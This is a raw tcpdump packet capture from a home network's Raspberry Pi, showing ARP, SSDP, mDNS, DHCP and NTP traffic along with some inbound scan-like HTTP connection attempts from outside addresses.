+17:14:13.605557 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [.], ack 15, win 502, length 0
+17:14:49.836071 IP 180-176-213-14.dynamic.kbronet.com.tw.49280 > alarmpi.http: Flags [FP.], seq 1:19, ack 1, win 7300, length 18: HTTP: GET / HTTP/1.1
+17:14:49.836597 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [P.], seq 1:310, ack 20, win 502, length 309: HTTP: HTTP/1.1 400 Bad Request
+17:14:49.836743 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [F.], seq 310, ack 20, win 502, length 0
+17:14:50.869745 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [F.], seq 310, ack 20, win 502, length 0
+17:14:53.909741 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [FP.], seq 1:310, ack 20, win 502, length 309: HTTP: HTTP/1.1 400 Bad Request
+17:14:54.842358 ARP, Request who-has alarmpi tell _gateway, length 46
+17:14:54.842438 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:14:54.869708 ARP, Request who-has _gateway tell alarmpi, length 28
+17:14:54.869868 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:15:00.469802 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [FP.], seq 1:310, ack 20, win 502, length 309: HTTP: HTTP/1.1 400 Bad Request
+17:15:04.582098 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [F.], seq 1, ack 1, win 502, length 0
+17:15:05.589723 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [F.], seq 1, ack 1, win 502, length 0
+17:15:08.136197 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [F.], seq 1, ack 15, win 502, length 0
+17:15:08.629726 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [F.], seq 1, ack 1, win 502, length 0
+17:15:09.189712 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [F.], seq 1, ack 15, win 502, length 0
+17:15:12.229749 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [F.], seq 1, ack 15, win 502, length 0
+17:15:12.629733 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [FP.], seq 1:310, ack 20, win 502, length 309: HTTP: HTTP/1.1 400 Bad Request
+17:15:15.189791 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [F.], seq 1, ack 1, win 502, length 0
+17:15:18.389748 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [F.], seq 1, ack 15, win 502, length 0
+17:15:27.349759 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [F.], seq 1, ack 1, win 502, length 0
+17:15:30.549730 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [F.], seq 1, ack 15, win 502, length 0
+17:15:36.949786 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49280: Flags [FP.], seq 1:310, ack 20, win 502, length 309: HTTP: HTTP/1.1 400 Bad Request
+17:15:41.989704 ARP, Request who-has _gateway tell alarmpi, length 28
+17:15:41.989942 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:15:51.669802 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49235: Flags [F.], seq 1, ack 1, win 502, length 0
+17:15:54.869756 IP alarmpi.http > 180-176-213-14.dynamic.kbronet.com.tw.49318: Flags [F.], seq 1, ack 15, win 502, length 0
+17:16:03.802968 IP pc3.40253 > 239.255.255.250.ssdp: UDP, length 166
+17:16:04.804784 IP pc3.40253 > 239.255.255.250.ssdp: UDP, length 166
+17:16:05.805773 IP pc3.40253 > 239.255.255.250.ssdp: UDP, length 166
+17:16:06.806408 IP pc3.40253 > 239.255.255.250.ssdp: UDP, length 166
+17:18:03.809460 IP pc3.59424 > 239.255.255.250.ssdp: UDP, length 166
+17:18:04.811006 IP pc3.59424 > 239.255.255.250.ssdp: UDP, length 166
+17:18:05.812193 IP pc3.59424 > 239.255.255.250.ssdp: UDP, length 166
+17:18:06.812628 IP pc3.59424 > 239.255.255.250.ssdp: UDP, length 166
+17:18:51.613191 ARP, Request who-has amazon-116d64fa5 tell _gateway, length 46
+17:20:03.812798 IP pc3.34185 > 239.255.255.250.ssdp: UDP, length 166
+17:20:04.813872 IP pc3.34185 > 239.255.255.250.ssdp: UDP, length 166
+17:20:05.814738 IP pc3.34185 > 239.255.255.250.ssdp: UDP, length 166
+17:20:06.816130 IP pc3.34185 > 239.255.255.250.ssdp: UDP, length 166
+17:22:03.821064 IP pc3.53943 > 239.255.255.250.ssdp: UDP, length 166
+17:22:04.822960 IP pc3.53943 > 239.255.255.250.ssdp: UDP, length 166
+17:22:05.823907 IP pc3.53943 > 239.255.255.250.ssdp: UDP, length 166
+17:22:06.824481 IP pc3.53943 > 239.255.255.250.ssdp: UDP, length 166
+17:24:03.827409 IP pc3.47950 > 239.255.255.250.ssdp: UDP, length 166
+17:24:04.828642 IP pc3.47950 > 239.255.255.250.ssdp: UDP, length 166
+17:24:05.829615 IP pc3.47950 > 239.255.255.250.ssdp: UDP, length 166
+17:24:06.830794 IP pc3.47950 > 239.255.255.250.ssdp: UDP, length 166
+17:24:30.653527 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:31.667553 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:32.648988 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:33.650144 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:34.650062 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:35.649906 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:43.655767 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:44.653783 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:45.653949 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:46.654539 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:47.652799 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:48.652968 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:56.656358 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:57.654072 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:58.653855 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:24:59.654201 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:00.654762 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:01.654357 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:09.674117 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:10.665333 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:11.652789 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:12.654356 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:13.652832 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:14.652803 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:20.014776 ARP, Request who-has amazon-116d64fa5 tell _gateway, length 46
+17:25:22.657622 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:23.653969 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:24.653840 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:25.654592 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:26.653735 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:25:27.653541 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:26:03.834022 IP pc3.43725 > 239.255.255.250.ssdp: UDP, length 166
+17:26:04.834778 IP pc3.43725 > 239.255.255.250.ssdp: UDP, length 166
+17:26:05.836442 IP pc3.43725 > 239.255.255.250.ssdp: UDP, length 166
+17:26:06.837519 IP pc3.43725 > 239.255.255.250.ssdp: UDP, length 166
+17:26:27.957828 IP6 alarmpi > ff02::2: ICMP6, router solicitation, length 16
+17:28:03.839886 IP pc3.52614 > 239.255.255.250.ssdp: UDP, length 166
+17:28:04.841631 IP pc3.52614 > 239.255.255.250.ssdp: UDP, length 166
+17:28:05.842742 IP pc3.52614 > 239.255.255.250.ssdp: UDP, length 166
+17:28:06.843651 IP pc3.52614 > 239.255.255.250.ssdp: UDP, length 166
+17:30:03.846744 IP pc3.57514 > 239.255.255.250.ssdp: UDP, length 166
+17:30:04.848426 IP pc3.57514 > 239.255.255.250.ssdp: UDP, length 166
+17:30:05.849042 IP pc3.57514 > 239.255.255.250.ssdp: UDP, length 166
+17:30:06.849905 IP pc3.57514 > 239.255.255.250.ssdp: UDP, length 166
+17:32:03.853449 IP pc3.50675 > 239.255.255.250.ssdp: UDP, length 166
+17:32:04.855190 IP pc3.50675 > 239.255.255.250.ssdp: UDP, length 166
+17:32:05.856231 IP pc3.50675 > 239.255.255.250.ssdp: UDP, length 166
+17:32:06.857192 IP pc3.50675 > 239.255.255.250.ssdp: UDP, length 166
+17:32:09.275423 IP alarmpi.44231 > time.cloudflare.com.ntp: NTPv4, Client, length 48
+17:32:09.287910 ARP, Request who-has alarmpi tell _gateway, length 46
+17:32:09.287978 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:32:09.288132 IP time.cloudflare.com.ntp > alarmpi.44231: NTPv4, Server, length 48
+17:32:14.309719 ARP, Request who-has _gateway tell alarmpi, length 28
+17:32:14.309933 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:34:03.859196 IP pc3.56469 > 239.255.255.250.ssdp: UDP, length 166
+17:34:04.860737 IP pc3.56469 > 239.255.255.250.ssdp: UDP, length 166
+17:34:05.861903 IP pc3.56469 > 239.255.255.250.ssdp: UDP, length 166
+17:34:06.862995 IP pc3.56469 > 239.255.255.250.ssdp: UDP, length 166
+17:36:03.865578 IP pc3.60859 > 239.255.255.250.ssdp: UDP, length 166
+17:36:04.866460 IP pc3.60859 > 239.255.255.250.ssdp: UDP, length 166
+17:36:05.867242 IP pc3.60859 > 239.255.255.250.ssdp: UDP, length 166
+17:36:06.868724 IP pc3.60859 > 239.255.255.250.ssdp: UDP, length 166
+17:36:26.949709 ARP, Request who-has alarmpi tell _gateway, length 46
+17:36:26.949800 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:36:26.949966 IP 87.251.74.223.56514 > alarmpi.http: Flags [S], seq 815005453, win 1024, options [mss 536], length 0
+17:36:26.950192 IP alarmpi.http > 87.251.74.223.56514: Flags [S.], seq 537887289, ack 815005454, win 64240, options [mss 1460], length 0
+17:36:27.028829 IP 87.251.74.223.56514 > alarmpi.http: Flags [R], seq 815005454, win 0, length 0
+17:36:27.038972 IP alarmpi.58434 > _gateway.domain: 5266+ [1au] PTR? 223.74.251.87.in-addr.arpa. (55)
+17:36:27.049980 IP _gateway.domain > alarmpi.58434: 5266 NXDomain 0/1/1 (111)
+17:36:27.075652 IP 87.251.74.223.56514 > alarmpi.http: Flags [R], seq 815005454, win 1200, length 0
+17:36:27.171104 IP alarmpi.34196 > 87.251.74.223.llmnr: Flags [S], seq 2441384524, win 64240, options [mss 1460,sackOK,TS val 1997573709 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+17:36:27.171512 IP _gateway > alarmpi: ICMP time exceeded in-transit, length 72
+17:36:31.989705 ARP, Request who-has _gateway tell alarmpi, length 28
+17:36:31.989969 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:38:03.871444 IP pc3.47308 > 239.255.255.250.ssdp: UDP, length 166
+17:38:04.872639 IP pc3.47308 > 239.255.255.250.ssdp: UDP, length 166
+17:38:05.873755 IP pc3.47308 > 239.255.255.250.ssdp: UDP, length 166
+17:38:06.875611 IP pc3.47308 > 239.255.255.250.ssdp: UDP, length 166
+17:40:03.878027 IP pc3.41962 > 239.255.255.250.ssdp: UDP, length 166
+17:40:04.879582 IP pc3.41962 > 239.255.255.250.ssdp: UDP, length 166
+17:40:05.881061 IP pc3.41962 > 239.255.255.250.ssdp: UDP, length 166
+17:40:06.882653 IP pc3.41962 > 239.255.255.250.ssdp: UDP, length 166
+17:42:03.884943 IP pc3.41605 > 239.255.255.250.ssdp: UDP, length 166
+17:42:04.886174 IP pc3.41605 > 239.255.255.250.ssdp: UDP, length 166
+17:42:05.887023 IP pc3.41605 > 239.255.255.250.ssdp: UDP, length 166
+17:42:06.888804 IP pc3.41605 > 239.255.255.250.ssdp: UDP, length 166
+17:43:52.658353 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:43:53.658432 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:43:54.657535 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:43:55.659211 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:43:56.657494 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:43:57.659155 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:03.891077 IP pc3.55546 > 239.255.255.250.ssdp: UDP, length 166
+17:44:04.892278 IP pc3.55546 > 239.255.255.250.ssdp: UDP, length 166
+17:44:05.661956 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:05.893182 IP pc3.55546 > 239.255.255.250.ssdp: UDP, length 166
+17:44:06.657546 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:06.894314 IP pc3.55546 > 239.255.255.250.ssdp: UDP, length 166
+17:44:07.667983 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:08.659066 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:09.658333 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:10.657598 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:18.660211 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:19.658579 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:20.658524 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:21.658709 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:22.659256 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:23.683040 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:31.661498 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:32.658470 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:33.675705 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:34.659111 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:35.658646 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:36.658783 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:44.680804 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:45.672095 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:46.663313 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:47.658922 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:48.659216 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:44:49.657541 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+17:46:03.897332 IP pc3.38540 > 239.255.255.250.ssdp: UDP, length 166
+17:46:04.898531 IP pc3.38540 > 239.255.255.250.ssdp: UDP, length 166
+17:46:05.899649 IP pc3.38540 > 239.255.255.250.ssdp: UDP, length 166
+17:46:06.901240 IP pc3.38540 > 239.255.255.250.ssdp: UDP, length 166
+17:48:03.903861 IP pc3.34807 > 239.255.255.250.ssdp: UDP, length 166
+17:48:04.905207 IP pc3.34807 > 239.255.255.250.ssdp: UDP, length 166
+17:48:05.905893 IP pc3.34807 > 239.255.255.250.ssdp: UDP, length 166
+17:48:06.907476 IP pc3.34807 > 239.255.255.250.ssdp: UDP, length 166
+17:50:03.910732 IP pc3.51066 > 239.255.255.250.ssdp: UDP, length 166
+17:50:04.912211 IP pc3.51066 > 239.255.255.250.ssdp: UDP, length 166
+17:50:05.913111 IP pc3.51066 > 239.255.255.250.ssdp: UDP, length 166
+17:50:06.913953 IP pc3.51066 > 239.255.255.250.ssdp: UDP, length 166
+17:51:14.128438 ARP, Request who-has alarmpi tell _gateway, length 46
+17:51:14.128542 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:51:14.128724 IP 218.24.45.75.x11 > alarmpi.http: Flags [S], seq 1442709504, win 16384, options [mss 536], length 0
+17:51:14.128959 IP alarmpi.http > 218.24.45.75.x11: Flags [S.], seq 4272693733, ack 1442709505, win 64240, options [mss 1460], length 0
+17:51:14.159706 IP alarmpi.allpeers > _gateway.domain: 25610+ [1au] PTR? 75.45.24.218.in-addr.arpa. (54)
+17:51:14.172851 IP _gateway.domain > alarmpi.allpeers: 25610 NXDomain 0/1/1 (108)
+17:51:14.275864 IP alarmpi.36542 > 218.24.45.75.llmnr: Flags [S], seq 2518742291, win 64240, options [mss 1460,sackOK,TS val 1548945882 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+17:51:14.276201 IP _gateway > alarmpi: ICMP time exceeded in-transit, length 72
+17:51:14.462310 IP 218.24.45.75.x11 > alarmpi.http: Flags [R], seq 1442709505, win 0, length 0
+17:51:19.189702 ARP, Request who-has _gateway tell alarmpi, length 28
+17:51:19.189929 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:52:03.916539 IP pc3.37298 > 239.255.255.250.ssdp: UDP, length 166
+17:52:04.918385 IP pc3.37298 > 239.255.255.250.ssdp: UDP, length 166
+17:52:05.919344 IP pc3.37298 > 239.255.255.250.ssdp: UDP, length 166
+17:52:06.920574 IP pc3.37298 > 239.255.255.250.ssdp: UDP, length 166
+17:53:58.844161 08:ee:8b:9b:34:cb (oui Unknown) > Broadcast Null Unnumbered, xid, Flags [Response], length 46: 01 00
+17:53:58.975936 IP6 :: > ff02::1:ff9b:34cb: ICMP6, neighbor solicitation, who has fe80::aee:8bff:fe9b:34cb, length 24
+17:53:58.983645 IP6 :: > ff02::16: HBH ICMP6, multicast listener report v2, 1 group record(s), length 28
+17:53:59.018885 IP6 :: > ff02::16: HBH ICMP6, multicast listener report v2, 1 group record(s), length 28
+17:53:59.051814 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 08:ee:8b:9b:34:cb (oui Unknown), length 286
+17:53:59.065439 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 08:ee:8b:9b:34:cb (oui Unknown), length 298
+17:53:59.156477 ARP, Request who-has _gateway tell mj, length 46
+17:53:59.522945 IP alarmpi.51662 > _gateway.domain: 33+ [1au] PTR? b.c.4.3.b.9.f.f.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa. (101)
+17:53:59.571493 ARP, Request who-has alarmpi tell _gateway, length 46
+17:53:59.571576 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+17:53:59.571788 IP _gateway.domain > alarmpi.51662: 33 NXDomain 0/1/1 (165)
+17:53:59.722641 IP6 alarmpi > ff02::1:ff9b:34cb: ICMP6, neighbor solicitation, who has fe80::aee:8bff:fe9b:34cb, length 32
+17:53:59.980622 IP6 fe80::aee:8bff:fe9b:34cb > ff02::2: ICMP6, router solicitation, length 16
+17:54:00.039795 IP alarmpi.43934 > _gateway.domain: 8384+ [1au] PTR? 6.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa. (101)
+17:54:00.051343 IP _gateway.domain > alarmpi.43934: 8384 NXDomain 0/1/1 (165)
+17:54:00.789749 IP6 alarmpi > ff02::1:ff9b:34cb: ICMP6, neighbor solicitation, who has fe80::aee:8bff:fe9b:34cb, length 32
+17:54:01.829718 IP6 alarmpi > ff02::1:ff9b:34cb: ICMP6, neighbor solicitation, who has fe80::aee:8bff:fe9b:34cb, length 32
+17:54:03.919989 IP pc3.45992 > 239.255.255.250.ssdp: UDP, length 166
+17:54:03.993806 IP6 fe80::aee:8bff:fe9b:34cb > ff02::2: ICMP6, router solicitation, length 16
+17:54:04.549712 ARP, Request who-has _gateway tell alarmpi, length 28
+17:54:04.549893 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+17:54:04.921286 IP pc3.45992 > 239.255.255.250.ssdp: UDP, length 166
+17:54:05.922243 IP pc3.45992 > 239.255.255.250.ssdp: UDP, length 166
+17:54:06.923309 IP pc3.45992 > 239.255.255.250.ssdp: UDP, length 166
+17:54:08.001958 IP6 fe80::aee:8bff:fe9b:34cb > ff02::2: ICMP6, router solicitation, length 16
+17:54:30.324710 4c:63:71:70:d9:ff (oui Unknown) > Broadcast Null Unnumbered, xid, Flags [Response], length 46: 01 00
+17:54:30.450267 IP6 :: > ff02::1:ff70:d9ff: ICMP6, neighbor solicitation, who has fe80::4e63:71ff:fe70:d9ff, length 32
+17:54:30.464048 IP6 :: > ff02::16: HBH ICMP6, multicast listener report v2, 1 group record(s), length 28
+17:54:30.473831 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 4c:63:71:70:d9:ff (oui Unknown), length 304
+17:54:30.484832 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 4c:63:71:70:d9:ff (oui Unknown), length 316
+17:54:30.563938 IP6 :: > ff02::16: HBH ICMP6, multicast listener report v2, 2 group record(s), length 48
+17:54:30.564019 IP RedmiNote8T-Redmi > igmp.mcast.net: igmp v3 report, 1 group record(s)
+17:54:30.673905 IP6 :: > ff02::16: HBH ICMP6, multicast listener report v2, 1 group record(s), length 28
+17:54:30.720803 ARP, Request who-has _gateway tell RedmiNote8T-Redmi, length 46
+17:54:30.722335 IP alarmpi.48030 > _gateway.domain: 26107+ [1au] PTR? f.f.9.d.0.7.f.f.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa. (101)
+17:54:30.777695 IP _gateway.domain > alarmpi.48030: 26107 NXDomain 0/1/1 (165)
+17:54:30.904079 IP6 alarmpi > ff02::1:ff70:d9ff: ICMP6, neighbor solicitation, who has fe80::4e63:71ff:fe70:d9ff, length 32
+17:54:30.973167 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::16: HBH ICMP6, multicast listener report v2, 2 group record(s), length 48
+17:54:30.973260 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::2: ICMP6, router solicitation, length 16
+17:54:31.036505 IP alarmpi.58064 > _gateway.domain: 25768+ [1au] PTR? 22.0.0.224.in-addr.arpa. (52)
+17:54:31.049446 IP _gateway.domain > alarmpi.58064: 25768 1/0/1 PTR igmp.mcast.net. (80)
+17:54:31.051324 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0 [2q] [2n] ANY (QU)? Android.local. ANY (QU)? Android.local. (81)
+17:54:31.052588 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0 [2q] [2n] ANY (QU)? Android.local. ANY (QU)? Android.local. (81)
+17:54:31.118254 IP6 fe80::4e63:71ff:fe70:d9ff > alarmpi: ICMP6, neighbor advertisement, tgt is fe80::4e63:71ff:fe70:d9ff, length 32
+17:54:31.118379 IP6 alarmpi.46552 > fe80::4e63:71ff:fe70:d9ff.llmnr: Flags [S], seq 3710264728, win 64800, options [mss 1440,sackOK,TS val 3870024268 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+17:54:31.125506 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::1:ff51:8493: ICMP6, neighbor solicitation, who has alarmpi, length 32
+17:54:31.125614 IP6 alarmpi > fe80::4e63:71ff:fe70:d9ff: ICMP6, neighbor advertisement, tgt is alarmpi, length 32
+17:54:31.127250 IP6 fe80::4e63:71ff:fe70:d9ff.llmnr > alarmpi.46552: Flags [R.], seq 0, ack 3710264729, win 0, length 0
+17:54:31.274313 IP RedmiNote8T-Redmi > igmp.mcast.net: igmp v3 report, 1 group record(s)
+17:54:31.302015 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0 [2q] [2n] ANY (QM)? Android.local. ANY (QM)? Android.local. (81)
+17:54:31.302155 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0 [2q] [2n] ANY (QM)? Android.local. ANY (QM)? Android.local. (81)
+17:54:31.553627 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0 [2q] [2n] ANY (QM)? Android.local. ANY (QM)? Android.local. (81)
+17:54:31.554094 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0 [2q] [2n] ANY (QM)? Android.local. ANY (QM)? Android.local. (81)
+17:54:31.725904 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::16: HBH ICMP6, multicast listener report v2, 2 group record(s), length 48
+17:54:31.759457 IP alarmpi.55255 > _gateway.domain: 21925+ [1au] PTR? 251.0.0.224.in-addr.arpa. (53)
+17:54:31.771107 IP _gateway.domain > alarmpi.55255: 21925 NXDomain 0/1/1 (110)
+17:54:31.809812 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:31.810059 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:31.956434 IP alarmpi.35692 > _gateway.domain: 21012+ [1au] PTR? b.f.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa. (101)
+17:54:31.971312 IP _gateway.domain > alarmpi.35692: 21012 NXDomain 0/1/1 (165)
+17:54:32.161114 IP alarmpi.33304 > _gateway.domain: 31768+ [1au] PTR? 3.9.4.8.1.5.f.f.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa. (101)
+17:54:32.206922 IP _gateway.domain > alarmpi.33304: 31768 NXDomain 0/1/1 (165)
+17:54:32.806075 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:32.806994 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:34.708038 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::2: ICMP6, router solicitation, length 16
+17:54:34.811579 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:34.811746 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:38.905451 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:38.906023 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:42.418337 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::2: ICMP6, router solicitation, length 16
